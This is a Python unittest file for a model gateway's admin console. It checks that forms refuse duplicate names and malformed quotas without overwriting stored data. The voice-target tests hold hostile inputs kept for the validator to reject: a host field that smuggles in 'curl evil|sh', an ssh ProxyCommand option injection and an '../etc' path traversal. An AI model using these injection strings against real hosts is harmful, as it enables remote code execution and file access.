"""Console create/save forms refuse bad input out loud — and overwrite nothing.

Why this fails SILENTLY:
- Creating something under a name that already exists REPLACED it: `chat_create`'s
  upsert swapped the alias's whole backend mapping for the one new entry, a new user
  merged into the existing one (role, grants, quotas), a new backend merged into the
  stored row of the same name, registering a workflow replaced the alias with its
  pins and chain — and every rename onto a taken name did the same. Each answered
  with the normal redirect (review 2026-09-23).
- Numbers that did not parse became "unset": `max_concurrent` "1.5", "-1" or "1e3"
  saved as NO cap, a daily quota of "1.5" or a cost quota of "5,00" as UNLIMITED —
  the one direction a limit must never fail in.
- A refusal was a bare page with "← Back" to an EMPTY form, answered 200; and the
  voice ship targets were only checked at the next ship, possibly much later.
So each form now answers 400 with itself re-rendered AS TYPED plus the reason, and
nothing is written.
"""
import html
import os
import sys
import tempfile
import unittest

_here = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
_prev = os.getcwd()
_tmp = tempfile.TemporaryDirectory()
with open(os.path.join(_tmp.name, "config.yaml"), "w") as _f:
    _f.write('api_key: ""\nbackends: []\n')
os.chdir(_tmp.name)
sys.path.insert(0, _here)
try:
    import main
    import admin
    import store
finally:
    os.chdir(_prev)
    _tmp.cleanup()
    del _tmp

from fastapi.testclient import TestClient  # noqa: E402

SAME = {"sec-fetch-site": "same-origin"}
_CALLBACKS = ("_apply_backends", "_apply_chat_aliases", "_apply_server_settings", "_apply_users",
              "_apply_reasoning", "_apply_hosts")


class _Fixture(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.addCleanup(self.tmp.cleanup)
        saved_store = (store._DB_PATH, store._active)
        self.addCleanup(lambda: (setattr(store, "_DB_PATH", saved_store[0]),
                                 setattr(store, "_active", saved_store[1])))
        store.init(os.path.join(self.tmp.name, "store.db"))
        saved_auth = (main.api_key, main.users, main._users_by_key)
        main.api_key, main.users, main._users_by_key = "", [], {}
        self.addCleanup(lambda: (setattr(main, "api_key", saved_auth[0]),
                                 setattr(main, "users", saved_auth[1]),
                                 setattr(main, "_users_by_key", saved_auth[2])))
        self.config_chat = {}
        self.config_backends = []
        stubs = {"_gateway_info": lambda: {"backends": self.config_backends + [
                     {**b, "source": "ui", "enabled": True, "healthy": True, "models": 0}
                     for b in store.list_backends()], "virtual_models": []},
                 "_gen_backends": lambda: [{"name": "gpu", "type": "comfyui"}],
                 "_comfy_backends": lambda: [],
                 "_llm_backends": lambda: [{"name": "llm", "models": ["m1"], "enabled": True}],
                 "_config_chat_aliases": lambda: dict(self.config_chat)}
        for k in list(stubs) + list(_CALLBACKS):
            self.addCleanup(setattr, admin, k, getattr(admin, k))
        for k, v in stubs.items():
            setattr(admin, k, v)
        for k in _CALLBACKS:
            setattr(admin, k, lambda: None)
        self.c = TestClient(main.app)

    def post(self, url, data, **kw):
        return self.c.post(url, data=data, headers=SAME, follow_redirects=False, **kw)

    def refused(self, r, *texts):
        self.assertEqual(r.status_code, 400, r.text[-400:])
        self.assertNotIn("← Back", r.text)
        for t in texts:           # the page escapes quotes: 'x' arrives as &#x27;x&#x27;
            self.assertTrue(t in r.text or html.escape(t) in r.text, f"{t!r} not in the page")


class Backends(_Fixture):
    BASE = {"name": "b1", "type": "openai", "url": "http://10.0.0.1:8080"}

    def test_new_backend_onto_an_existing_name_is_refused(self):
        store.upsert_backend({**self.BASE, "max_concurrent": 4, "api_key": "secret-1"})
        r = self.post("/ui/backends/save", {**self.BASE, "url": "http://10.9.9.9:1"})
        self.refused(r, "already exists", 'value="http://10.9.9.9:1"')
        b = store.get_backend("b1", "openai")
        self.assertEqual((b["url"], b["max_concurrent"]), ("http://10.0.0.1:8080", 4))

    def test_new_backend_onto_a_config_backend_is_refused(self):
        self.config_backends.append({**self.BASE, "source": "config", "enabled": True,
                                     "healthy": True, "models": 0})
        self.refused(self.post("/ui/backends/save", self.BASE), "already exists")
        self.assertIsNone(store.get_backend("b1", "openai"))

    def test_rename_onto_an_existing_name_is_refused(self):
        store.upsert_backend(self.BASE)
        store.upsert_backend({**self.BASE, "name": "b2", "url": "http://10.0.0.2:1"})
        r = self.post("/ui/backends/save", {**self.BASE, "name": "b2", "orig": "openai:b1"})
        self.refused(r, "already exists", 'name="orig" value="openai:b1"')
        self.assertEqual(store.get_backend("b2", "openai")["url"], "http://10.0.0.2:1")
        self.assertIsNotNone(store.get_backend("b1", "openai"))

    def test_editing_keeps_its_own_name(self):
        store.upsert_backend(self.BASE)
        r = self.post("/ui/backends/save", {**self.BASE, "orig": "openai:b1", "max_concurrent": "2"})
        self.assertEqual(r.status_code, 303)
        self.assertEqual(store.get_backend("b1", "openai")["max_concurrent"], 2)

    def test_max_concurrent_must_be_a_whole_number(self):
        for bad in ("1.5", "-1", "1e3", "5,00", "two"):
            r = self.post("/ui/backends/save", {**self.BASE, "max_concurrent": bad})
            self.refused(r, "max_concurrent", f"'{bad}'")
            self.assertIsNone(store.get_backend("b1", "openai"), bad)
        self.assertEqual(self.post("/ui/backends/save", {**self.BASE, "max_concurrent": ""}).status_code, 303)
        self.assertNotIn("max_concurrent", store.get_backend("b1", "openai"))   # blank = unlimited

    def test_comfy_numbers_are_checked_for_comfy_only(self):
        comfy = {"name": "g", "type": "comfyui", "url": "http://10.0.0.3:8188"}
        self.refused(self.post("/ui/backends/save", {**comfy, "max_wait": "1.5"}), "max wait")
        self.refused(self.post("/ui/backends/save", {**comfy, "poll_interval": "x"}), "poll interval")
        # the same hidden-pane field on an openai backend cannot be seen, so it cannot block
        self.assertEqual(self.post("/ui/backends/save", {**self.BASE, "max_wait": "x"}).status_code, 303)

    def test_refusal_keeps_the_typed_sampling_values(self):
        r = self.post("/ui/backends/save", {**self.BASE, "smp_temperature": "0.7",
                                            "smp_more": "{broken"})
        self.refused(r, "invalid JSON", 'value="0.7"', "{broken")


class Users(_Fixture):
    def test_new_user_onto_an_existing_name_is_refused(self):
        store.upsert_user({"name": "kai", "role": "admin", "api_key": "k", "models": ["x"]})
        r = self.post("/ui/users/save", {"name": "kai", "role": "user"})
        self.refused(r, "already exists")
        self.assertEqual(store.get_user("kai")["role"], "admin")

    def test_rename_onto_an_existing_name_is_refused(self):
        store.upsert_user({"name": "kai", "role": "admin", "api_key": "k1"})
        store.upsert_user({"name": "bob", "role": "user", "api_key": "k2"})
        r = self.post("/ui/users/save", {"name": "kai", "orig": "bob", "role": "user"})
        self.refused(r, "already exists", 'name="orig" value="bob"')
        self.assertEqual(store.get_user("kai")["role"], "admin")
        self.assertIsNotNone(store.get_user("bob"))

    def test_quotas_must_parse(self):
        for field, bad in (("quota_req_day", "1.5"), ("quota_req_day", "-1"), ("quota_req_day", "1e3"),
                           ("quota_cost_month", "-1"), ("quota_cost_month", "abc"),
                           ("quota_cost_month", "inf")):
            r = self.post("/ui/users/save", {"name": "u", "role": "user", field: bad})
            self.refused(r, f"'{bad}'", f'value="{bad}"')
            self.assertIsNone(store.get_user("u"), (field, bad))

    def test_blank_is_unlimited_and_a_decimal_comma_is_a_decimal(self):
        r = self.post("/ui/users/save", {"name": "u", "role": "user", "quota_req_day": "",
                                         "quota_cost_month": "5,00"})
        self.assertEqual(r.status_code, 303)
        u = store.get_user("u")
        self.assertIsNone(u["quota_req_day"])
        self.assertEqual(u["quota_cost_month"], 5.0)


class ChatAliases(_Fixture):
    def test_create_onto_an_existing_alias_is_refused(self):
        store.upsert_chat_alias("fast", {"llm": "m1", "other": "m2"})
        r = self.post("/ui/chat/create", {"alias": "fast", "backend": "llm", "model": "m9"})
        self.refused(r, "already exists", 'value="m9"')
        self.assertEqual(store.get_chat_alias("fast"), {"llm": "m1", "other": "m2"})

    def test_create_onto_a_config_alias_is_refused(self):
        self.config_chat["cfg"] = "m1"
        self.refused(self.post("/ui/chat/create", {"alias": "cfg", "backend": "llm", "model": "m1"}),
                     "already exists")
        self.assertIsNone(store.get_chat_alias("cfg"))

    def test_rename_onto_an_existing_alias_is_refused(self):
        store.upsert_chat_alias("a", {"llm": "m1"})
        store.upsert_chat_alias("b", {"llm": "m2"})
        r = self.post("/ui/chat/save", {"orig": "a", "alias": "b", "model__llm": "m7"})
        self.refused(r, "already exists", 'value="m7"')
        self.assertEqual(store.get_chat_alias("b"), {"llm": "m2"})
        self.assertEqual(store.get_chat_alias("a"), {"llm": "m1"})

    def test_bad_sampling_keeps_the_editor_as_typed(self):
        store.upsert_chat_alias("a", {"llm": "m1"})
        r = self.post("/ui/chat/save", {"orig": "a", "alias": "a", "model__llm": "m7",
                                        "park_s": "12", "smp_more": "[1]"})
        self.refused(r, "must be a JSON object", 'value="m7"', 'value="12"')
        self.assertEqual(store.get_chat_alias("a"), {"llm": "m1"})


class MediaAliases(_Fixture):
    def test_register_onto_an_existing_alias_is_refused(self):
        store.upsert("flux", [{"backend": "gpu", "workflow_json": {"1": {}}, "mapping": {"p": {}}}])
        r = self.post("/ui/mapping/register", {"alias": "flux", "backend": "gpu",
                                               "workflow_path": "/nonexistent/x.json"})
        self.refused(r, "already exists", 'value="/nonexistent/x.json"')
        self.assertEqual(store.get("flux")[0]["mapping"], {"p": {}})

    def test_register_error_keeps_what_was_typed(self):
        r = self.post("/ui/mapping/register", {"alias": "new1", "backend": "gpu", "task": "img2img",
                                               "workflow_path": "/nonexistent/x.json"})
        self.refused(r, "invalid workflow JSON", 'value="new1"', 'value="img2img" selected')
        self.assertIsNone(store.get("new1"))


class VoiceTargets(_Fixture):
    def setUp(self):
        super().setUp()
        self.addCleanup(setattr, admin, "_parse_voice_target", admin._parse_voice_target)
        self.addCleanup(setattr, admin, "_voice_dir_ok", admin._voice_dir_ok)
        admin._parse_voice_target = main.parse_voice_target      # what main binds
        admin._voice_dir_ok = main._voice_dir_ok

    def _save(self, hosts, vdir):
        return self.post("/ui/playground/voice-target", {"hosts": hosts, "dir": vdir,
                                                         "whisper_model": "small"})

    def test_bad_targets_are_refused_where_they_are_typed(self):
        for hosts, vdir, why in (("root@box:/x;curl evil|sh", "/models/voices", "refused"),
                                 ("-oProxyCommand=x:/d", "/models/voices", "refused"),
                                 ("root@box:/srv/voices", "/models/../etc", "voice dir"),
                                 ("root@box:/srv/voices", "", "voice dir is required")):
            r = self._save(hosts, vdir)
            self.refused(r, why)
            self.assertNotIn("voice_ref_hosts", store.get_settings(), hosts)

    def test_refusal_shows_the_typed_values(self):
        r = self._save("root@box:/x;y", "/models/voices")
        self.refused(r, 'value="root@box:/x;y"', 'value="/models/voices"')

    def test_good_and_empty_settings_save(self):
        self.assertEqual(self._save("root@a:/srv/v, kai@b:/opt/v", "/models/voices").status_code, 303)
        self.assertEqual(store.get_settings()["voice_ref_dir"], "/models/voices")
        self.assertEqual(self._save("", "").status_code, 303)       # clearing is allowed


if __name__ == "__main__":
    unittest.main()
